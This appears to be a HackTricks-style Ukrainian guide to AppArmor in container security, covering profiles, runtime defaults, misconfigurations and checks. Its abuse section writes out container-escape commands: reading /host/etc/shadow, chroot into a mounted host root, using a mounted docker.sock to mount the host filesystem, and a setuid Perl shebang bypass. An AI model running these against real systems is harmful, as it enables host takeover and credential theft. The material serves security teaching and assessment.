# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

AppArmor — це система **обов'язкового контролю доступу (Mandatory Access Control)**, яка застосовує обмеження через профілі для кожної програми. На відміну від традиційних перевірок DAC, що значною мірою залежать від власника та групи, AppArmor дозволяє ядру застосовувати політику, прив'язану безпосередньо до процесу. У середовищах контейнерів це має значення, бо робоче навантаження може мати достатньо традиційних привілеїв для спроби виконати дію, але все одно отримати відмову, якщо його профіль AppArmor не дозволяє відповідний шлях, mount, мережеву поведінку або використання capability.

Найважливіша концептуальна риса в тому, що AppArmor є **заснованим на шляхах (path-based)**. Він оцінює доступ до файлової системи через правила на основі шляхів, а не через мітки, як це робить SELinux. Це робить його доступним для розуміння та потужним, але також означає, що bind mounts і альтернативні розташування шляхів заслуговують на ретельну увагу. Якщо той самий вміст хоста стає доступним під іншим шляхом, ефект політики може відрізнятися від того, що оператор спочатку очікував.

## Роль в ізоляції контейнерів

Огляди безпеки контейнерів часто зупиняються на capabilities і seccomp, але AppArmor продовжує бути важливим після цих перевірок. Уявіть контейнер, який має більше привілеїв, ніж повинен, або робоче навантаження, що вимагало однієї додаткової capability з операційних причин. AppArmor все ще може обмежувати доступ до файлів, поведінку mount, мережеві операції та шаблони виконання таким чином, щоб зупинити очевидний шлях зловживання. Саме тому відключення AppArmor "просто щоб додаток запрацював" може непомітно перетворити лишень ризикову конфігурацію на таку, що активно експлуатується.

## Лабораторія

Щоб перевірити, чи AppArmor активний на хості, використайте:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Щоб побачити, під ким виконується поточний процес контейнера:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Різниця повчальна. У звичайному випадку процес має показувати контекст AppArmor, прив'язаний до профілю, обраного середовищем виконання. У випадку unconfined цей додатковий рівень обмежень зникає.

Також можна перевірити, що Docker вважає застосованим:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker може застосовувати стандартний або власний профіль AppArmor, якщо хост це підтримує. Podman також може інтегруватися з AppArmor на системах, орієнтованих на AppArmor, хоча на дистрибутивах з пріоритетом SELinux інша система MAC часто домінує. Kubernetes може розгортати політику AppArmor на рівні workload на вузлах, які фактично підтримують AppArmor. LXC та споріднені середовища system-container сімейства Ubuntu також широко використовують AppArmor.

Практичний висновок: AppArmor — це не "Docker feature". Це функція хоста/ядра, яку можуть застосувати різні runtimes. Якщо хост не підтримує її або runtime вказано запускатися unconfined, очікуваного захисту фактично немає.

На AppArmor-хостах з підтримкою Docker найвідомішим дефолтним профілем є `docker-default`. Цей профіль згенеровано з AppArmor-шаблону Moby і він важливий, оскільки пояснює, чому деякі capability-based PoCs досі не працюють у дефолтному контейнері. У загальних рисах `docker-default` дозволяє звичайні мережеві операції, забороняє записи у велику частину `/proc`, блокує доступ до чутливих частин `/sys`, перешкоджає операціям mount і обмежує ptrace так, щоб він не був загальним примітивом для дослідження хоста. Розуміння цього базового рівня допомагає відрізнити "the container has `CAP_SYS_ADMIN`" від "the container can actually use that capability against the kernel interfaces I care about".

## Profile Management

AppArmor profiles are usually stored under `/etc/apparmor.d/`. A common naming convention is to replace slashes in the executable path with dots. For example, a profile for `/usr/bin/man` is commonly stored as `/etc/apparmor.d/usr.bin.man`. This detail matters during both defense and assessment because once you know the active profile name, you can often locate the corresponding file quickly on the host.

Корисні команди для управління на стороні хоста включають:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Причина, чому ці команди важливі в довіднику з безпеки контейнерів, полягає в тому, що вони пояснюють, як профілі фактично створюються, завантажуються, переключаються в complain mode і змінюються після змін у застосунку. Якщо оператор має звичку переводити профілі в complain mode під час усунення несправностей і забуває відновити enforcement, контейнер може виглядати захищеним у документації, водночас насправді працювати значно вільніше.

### Створення та оновлення профілів

`aa-genprof` може спостерігати за поведінкою застосунку та допомогти інтерактивно згенерувати профіль:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` може згенерувати шаблон профілю, який потім можна завантажити за допомогою `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Коли бінарний файл змінюється і політику потрібно оновити, `aa-logprof` може відтворити відмови, знайдені в логах, і допомогти оператору вирішити, дозволити їх чи заборонити:
```bash
sudo aa-logprof
```
### Журнали

Відмови AppArmor зазвичай видно через `auditd`, syslog або інструменти, такі як `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Це корисно в операційному та наступальному плані. Захисники використовують це для уточнення профілів. Атакувальники використовують це, щоб дізнатися, який саме шлях або операція відхиляється і чи AppArmor є контролем, що блокує ланцюжок експлойтів.

### Визначення точного файлу профілю

Коли runtime показує конкретну назву профілю AppArmor для container, часто корисно зіставити цю назву з файлом профілю на диску:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Це особливо корисно під час перевірки на стороні хоста, оскільки воно заповнює розрив між "the container says it is running under profile `lowpriv`" і "the actual rules live in this specific file that can be audited or reloaded".

## Неправильні конфігурації

Найочевидніша помилка — `apparmor=unconfined`. Адміністратори часто встановлюють його під час налагодження застосунку, який не запустився через те, що профіль правильно заблокував щось небезпечне або несподіване. Якщо цей прапорець залишиться у продуктивному середовищі, весь шар MAC фактично буде відключений.

Інша тонка проблема — припущення, що bind mounts нешкідливі, бо дозволи файлів виглядають нормальними. Оскільки AppArmor працює на основі шляхів, відкрите відображення шляхів хоста в альтернативних точках монтування може погано взаємодіяти з правилами шляхів. Третя помилка — забувати, що назва профілю в файлі конфігурації мало що означає, якщо ядро хоста фактично не застосовує AppArmor.

## Зловживання

Коли AppArmor відсутній, операції, які раніше були обмежені, можуть раптово почати працювати: читання чутливих шляхів через bind mounts, доступ до частин procfs або sysfs, які мали залишатися важкодоступними, виконання дій, пов'язаних з mount, якщо capabilities/seccomp також це дозволяють, або використання шляхів, які профіль зазвичай забороняє. AppArmor часто є механізмом, що пояснює, чому спроба capability-based breakout «на папері має працювати», але на практиці все одно зазнає невдачі. Прибравши AppArmor, та сама спроба може почати вдаватися.

Якщо ви підозрюєте, що AppArmor є основним чинником, що перешкоджає path-traversal, bind-mount або mount-based abuse chain, першим кроком зазвичай є порівняння того, що стає доступним з профілем і без нього. Наприклад, якщо шлях хоста змонтовано всередині контейнера, почніть з перевірки, чи можете ви пройти по ньому і прочитати його:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Якщо контейнер також має небезпечну capability, таку як `CAP_SYS_ADMIN`, один із найпрактичніших тестів — перевірити, чи AppArmor є контролем, що блокує mount operations або доступ до чутливих kernel filesystems:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
У середовищах, де шлях хоста вже доступний через bind mount, втрата AppArmor може також перетворити read-only information-disclosure issue на прямий доступ до файлів хоста:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Суть цих команд не в тому, що AppArmor сам по собі створює breakout. Суть у тому, що після видалення AppArmor багато filesystem і mount-based шляхів для зловживань одразу стають доступними для тестування.

### Повний приклад: AppArmor Disabled + Host Root Mounted

Якщо контейнер вже має host root bind-mounted at `/host`, видалення AppArmor може перетворити заблокований filesystem abuse path на повний host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Як тільки shell виконується через host filesystem, робоче навантаження фактично вийшло за межі container:
```bash
id
hostname
cat /etc/shadow | head
```
### Повний приклад: AppArmor Disabled + Runtime Socket

Якщо реальним бар'єром був AppArmor навколо runtime state, змонтований socket може вистачити для повного escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Точний шлях залежить від точки монтування, але кінцевий результат той самий: AppArmor більше не перешкоджає доступу до runtime API, і runtime API може запустити контейнер, який скомпрометує хост.

### Повний приклад: Path-Based Bind-Mount Bypass

Оскільки AppArmor прив'язаний до шляхів, захист `/proc/**` не автоматично захищає той самий вміст procfs хоста, якщо він доступний через інший шлях:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Наслідки залежать від того, що саме змонтовано і чи обходить альтернативний шлях інші контролі, але цей шаблон — одна з найочевидніших причин, чому AppArmor треба оцінювати разом із розташуванням монтувань, а не окремо.

### Повний приклад: Shebang Bypass

AppArmor policy іноді націлюється на шлях інтерпретатора таким чином, що не повністю враховується виконання скриптів через обробку shebang. Історичний приклад полягав у використанні скрипту, перший рядок якого вказує на обмежений інтерпретатор:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Такий приклад важливий як нагадування, що наміри профілю і фактична семантика виконання можуть розходитися. Під час перегляду AppArmor у середовищах контейнерів ланцюжки інтерпретаторів і альтернативні шляхи виконання заслуговують на особливу увагу.

## Перевірки

Метою цих перевірок є швидко відповісти на три питання: чи ввімкнено AppArmor на хості, чи обмежено поточний процес, і чи середовище виконання дійсно застосувало профіль до цього контейнера?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Що тут цікаво:

- Якщо `/proc/self/attr/current` показує `unconfined`, робоче навантаження не отримує переваг від ізоляції AppArmor.
- Якщо `aa-status` показує, що AppArmor вимкнено або не завантажено, будь-яка назва профілю в конфігурації середовища виконання здебільшого косметична.
- Якщо `docker inspect` показує `unconfined` або несподіваний кастомний профіль, це часто є причиною, чому працює шлях зловживання на основі файлової системи або монтувань.

Якщо контейнер вже має підвищені привілеї з операційних причин, залишення AppArmor увімкненим часто робить різницю між контрольованим винятком і набагато ширшим провалом у безпеці.

## Налаштування виконання за замовчуванням

| Runtime / platform | Стан за замовчуванням | Поведінка за замовчуванням | Типові ручні послаблення |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням на хостах з підтримкою AppArmor | Використовує профіль AppArmor `docker-default`, якщо його не перевизначено | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Залежить від хоста | AppArmor підтримується через `--security-opt`, але точний стан за замовчуванням залежить від хоста/середовища виконання і менш універсальний, ніж задокументований у Docker профіль `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Умовний стан за замовчуванням | Якщо `appArmorProfile.type` не вказано, за замовчуванням використовується `RuntimeDefault`, але це застосовується лише тоді, коли AppArmor увімкнено на вузлі | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` з слабким профілем, вузли без підтримки AppArmor |
| containerd / CRI-O under Kubernetes | Залежить від підтримки вузла/середовища виконання | Поширені середовища виконання, які підтримує Kubernetes, підтримують AppArmor, але фактичне примусове застосування все ще залежить від підтримки вузла та налаштувань робочого навантаження | Те ж, що й у рядку Kubernetes; пряма конфігурація середовища виконання також може повністю обійти AppArmor |

Для AppArmor найважливішою змінною часто є саме **хост**, а не лише середовище виконання. Налаштування профілю в манифесті не створює ізоляцію на вузлі, де AppArmor не увімкнено.
{{#include ../../../../banners/hacktricks-training.md}}
